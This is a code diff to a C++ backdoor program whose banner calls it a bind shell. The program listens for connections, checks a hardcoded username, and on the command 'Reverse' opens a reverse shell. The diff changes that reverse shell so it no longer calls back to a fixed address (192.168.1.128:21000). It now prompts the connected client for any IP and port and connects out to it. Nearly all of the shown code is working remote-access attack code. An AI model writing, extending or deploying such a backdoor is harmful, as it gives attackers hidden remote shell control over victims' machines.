@@ -11,7 +11,9 @@ using namespace std;
 string messages_[] = {
                       "\t\tHello In My World\n \t\tHer The Bind Shell\n\t\t 'Just For Fun'\n\n",
                       "  Login Please\n USeR: ",
-                      " Pass: "
+                      " Pass: ",
+                      "To Reverse Shell Enter\n Ip: ",
+                      " Port: "
                      };
 int login_auth(string Password,string User){
         if(strcmp(User.c_str(),"AXO\n"))
@@ -52,12 +54,21 @@ int write_me(char* buff,int size){
     }
 }
 
-int Reverse_Shell(char* ip,int port){
+int Reverse_Shell(int sock){
+    char port[6];
+    char ip[16];
+
+    send(sock,messages_[3].c_str(),messages_[3].size(),0);
+    recv(sock,ip,15,0);
+
+    send(sock,messages_[4].c_str(),messages_[4].size(),0);
+    recv(sock,port,6,0);
+
     struct sockaddr_in revsockaddr;
 
     int sockt = socket(AF_INET, SOCK_STREAM, 0);
     revsockaddr.sin_family = AF_INET;
-    revsockaddr.sin_port = htons(port);
+    revsockaddr.sin_port = htons(atoi(port));
     revsockaddr.sin_addr.s_addr = inet_addr(ip);
 
     connect(sockt, (struct sockaddr *) &revsockaddr,
@@ -102,7 +113,7 @@ main_:
         int recv_size = recv(accept_,buff,4096,0);
         write_me(buff,recv_size);
         if(!strcmp(buff,"Reverse\n"))
-            Reverse_Shell("192.168.1.128",21000);
+            Reverse_Shell(accept_);
         if(recv_size<1){
             close(accept_);
             cout<<"Deconnected From It"<<endl;
